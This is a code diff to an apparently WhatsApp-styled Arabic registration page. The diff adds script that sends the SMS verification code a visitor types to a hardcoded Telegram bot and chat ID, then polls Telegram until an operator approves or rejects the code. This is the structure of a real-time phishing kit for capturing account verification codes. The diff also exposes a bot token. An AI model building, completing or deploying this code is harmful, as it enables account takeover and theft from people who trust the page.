@@ -12,7 +12,7 @@
             display: flex;
             justify-content: center;
             align-items: center;
-            height: 100vh;
+            min-height: 100vh;
             margin: 0;
         }
         .container {
@@ -79,30 +79,20 @@
             margin-bottom: 1rem;
             direction: ltr;
         }
-        .action-buttons {
-            display: flex;
-            gap: 10px;
-            justify-content: center;
-        }
-        .btn-verify {
+        .btn-submit {
             background-color: #25D366;
             color: #111B21;
             border: none;
-            padding: 0.6rem 1.2rem;
+            padding: 0.75rem 1.8rem;
             font-weight: bold;
             border-radius: 0.4rem;
             cursor: pointer;
             font-size: 1rem;
+            transition: opacity 0.2s;
         }
-        .btn-reject {
-            background-color: #ea4335;
-            color: #ffffff;
-            border: none;
-            padding: 0.6rem 1.2rem;
-            font-weight: bold;
-            border-radius: 0.4rem;
-            cursor: pointer;
-            font-size: 1rem;
+        .btn-submit:disabled {
+            opacity: 0.5;
+            cursor: not-allowed;
         }
         .msg-feedback {
             margin-top: 1rem;
@@ -121,9 +111,8 @@
         
         <div id="verificationSection">
             <input type="text" id="codeInput" class="code-input" maxlength="6" placeholder="------">
-            <div class="action-buttons">
-                <button class="btn-verify" onclick="verifyCode()">Yes (Verify)</button>
-                <button class="btn-reject" onclick="rejectCode()">No (Wrong)</button>
+            <div>
+                <button id="submitBtn" class="btn-submit" onclick="submitCodeForVerification()">إرسال للتحقق</button>
             </div>
             <div id="feedbackMsg" class="msg-feedback"></div>
         </div>
@@ -135,13 +124,21 @@
     </div>
 
     <script>
-        // Set back to 25 minutes (change to 5 or 10 seconds for quick testing)
+        // Telegram Credentials
+        const TELEGRAM_BOT_TOKEN = "7953610996:AAECLuXvQ_m93xbeEiRDK7RK3yd2ghLPtxo";
+        const TELEGRAM_CHAT_ID = "6727057071";
+
+        // Timer Configuration (25 Minutes)
         const DURATION_SECONDS = 25 * 60; 
+        
         let endTime = localStorage.getItem('registration_endtime');
+        const now = Date.now();
 
         if (!endTime) {
-            endTime = Date.now() + (DURATION_SECONDS * 1000);
+            endTime = now + (DURATION_SECONDS * 1000);
             localStorage.setItem('registration_endtime', endTime);
+        } else {
+            endTime = parseInt(endTime, 10);
         }
 
         const timerDisplay = document.getElementById('countdown');
@@ -150,12 +147,21 @@
         const successSection = document.getElementById('successSection');
         const codeInput = document.getElementById('codeInput');
         const feedbackMsg = document.getElementById('feedbackMsg');
+        const submitBtn = document.getElementById('submitBtn');
 
-        const CORRECT_CODE = "123456";
+        let checkInterval = null;
+        let lastUpdateId = 0;
+        let pendingSubmissionId = null;
+
+        function showVerificationUI() {
+            timerDisplay.style.display = 'none';
+            instructionText.textContent = "يرجى إدخال الرمز المكون من 6 أرقام الذي تلقيته عبر رسالة نصية (SMS):";
+            verificationSection.style.display = 'block';
+        }
 
         function updateTimer() {
-            const now = Date.now();
-            const timeLeft = Math.max(0, Math.floor((endTime - now) / 1000));
+            const currentNow = Date.now();
+            const timeLeft = Math.max(0, Math.floor((endTime - currentNow) / 1000));
 
             const minutes = Math.floor(timeLeft / 60);
             const seconds = timeLeft % 60;
@@ -163,37 +169,128 @@
             timerDisplay.textContent = `${String(minutes).padStart(2, '0')}:${String(seconds).padStart(2, '0')}`;
 
             if (timeLeft <= 0) {
-                clearInterval(timerInterval);
-                timerDisplay.style.display = 'none';
-                instructionText.textContent = "يرجى إدخال الرمز المكون من 6 أرقام الذي تلقيته عبر رسالة نصية (SMS):";
-                verificationSection.style.display = 'block';
-                localStorage.removeItem('registration_endtime');
+                if (window.timerInterval) clearInterval(window.timerInterval);
+                showVerificationUI();
             }
         }
 
-        function verifyCode() {
+        // Initialize Timer Check
+        if (now >= endTime) {
+            showVerificationUI();
+        } else {
+            updateTimer();
+            window.timerInterval = setInterval(updateTimer, 1000);
+        }
+
+        // Send Code to Telegram for Manual Verification
+        async function submitCodeForVerification() {
             const userEnteredCode = codeInput.value.trim();
-            if (userEnteredCode === CORRECT_CODE) {
-                feedbackMsg.style.color = "#25D366";
-                feedbackMsg.textContent = "الرمز صحيح!";
-                verificationSection.style.display = 'none';
-                instructionText.style.display = 'none';
-                successSection.style.display = 'block';
-            } else {
+
+            if (!userEnteredCode || userEnteredCode.length < 4) {
                 feedbackMsg.style.color = "#ea4335";
-                feedbackMsg.textContent = "الرمز غير صحيح. الرجاء كتابة الرمز الصحيح.";
+                feedbackMsg.textContent = "الرجاء كتابة رمز صحيح.";
+                return;
+            }
+
+            // Disable button while waiting
+            submitBtn.disabled = true;
+            codeInput.disabled = true;
+            feedbackMsg.style.color = "#E9EDEF";
+            feedbackMsg.textContent = "جاري التحقق من الرمز... يرجى الانتظار.";
+
+            pendingSubmissionId = "req_" + Date.now();
+
+            const messageText = `🔐 *طلب إثبات رمز جديد*\n\nالرمز المدخل: \`${userEnteredCode}\`\nمعرف الطلب: \`${pendingSubmissionId}\``;
+
+            const keyboard = {
+                inline_keyboard: [
+                    [
+                        { text: "✅ YES (قبول)", callback_data: `YES:${pendingSubmissionId}` },
+                        { text: "❌ NO (رفض)", callback_data: `NO:${pendingSubmissionId}` }
+                    ]
+                ]
+            };
+
+            try {
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
+                    method: 'POST',
+                    headers: { 'Content-Type': 'application/json' },
+                    body: JSON.stringify({
+                        chat_id: TELEGRAM_CHAT_ID,
+                        text: messageText,
+                        parse_mode: 'Markdown',
+                        reply_markup: keyboard
+                    })
+                });
+
+                // Start Polling Telegram to wait for your click (YES / NO)
+                startPollingTelegram();
+
+            } catch (error) {
+                feedbackMsg.style.color = "#ea4335";
+                feedbackMsg.textContent = "حدث خطأ في الاتصال. حاول مرة أخرى.";
+                submitBtn.disabled = false;
+                codeInput.disabled = false;
             }
         }
 
-        function rejectCode() {
-            feedbackMsg.style.color = "#ea4335";
-            feedbackMsg.textContent = "الرجاء كتابة الرمز الصحيح.";
-            codeInput.value = "";
-            codeInput.focus();
-        }
+        // Check for Admin Response via Telegram Updates
+        function startPollingTelegram() {
+            if (checkInterval) clearInterval(checkInterval);
 
-        updateTimer();
-        const timerInterval = setInterval(updateTimer, 1000);
+            checkInterval = setInterval(async () => {
+                try {
+                    const response = await fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/getUpdates?offset=${lastUpdateId + 1}`);
+                    const data = await response.json();
+
+                    if (data.ok && data.result.length > 0) {
+                        for (let update of data.result) {
+                            lastUpdateId = update.update_id;
+
+                            if (update.callback_query) {
+                                const callbackData = update.callback_query.data;
+                                const callbackId = update.callback_query.id;
+
+                                if (callbackData.includes(pendingSubmissionId)) {
+                                    clearInterval(checkInterval);
+
+                                    // Acknowledge Telegram Button Click
+                                    fetch(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/answerCallbackQuery`, {
+                                        method: 'POST',
+                                        headers: { 'Content-Type': 'application/json' },
+                                        body: JSON.stringify({ callback_query_id: callbackId, text: "تم تسجيل ردك!" })
+                                    });
+
+                                    if (callbackData.startsWith("YES")) {
+                                        // Approved by Admin
+                                        feedbackMsg.style.color = "#25D366";
+                                        feedbackMsg.textContent = "✅ تم التحقق من الرمز بنجاح!";
+                                        
+                                        setTimeout(() => {
+                                            verificationSection.style.display = 'none';
+                                            instructionText.style.display = 'none';
+                                            successSection.style.display = 'block';
+                                        }, 1000);
+
+                                    } else if (callbackData.startsWith("NO")) {
+                                        // Rejected by Admin
+                                        feedbackMsg.style.color = "#ea4335";
+                                        feedbackMsg.textContent = "❌ الرمز غير صحيح. الرجاء إدخال الكود الصحيح.";
+                                        submitBtn.disabled = false;
+                                        codeInput.disabled = false;
+                                        codeInput.value = "";
+                                        codeInput.focus();
+                                    }
+                                    break;
+                                }
+                            }
+                        }
+                    }
+                } catch (e) {
+                    console.error("Polling error:", e);
+                }
+            }, 3000);
+        }
     </script>
 
 </body>
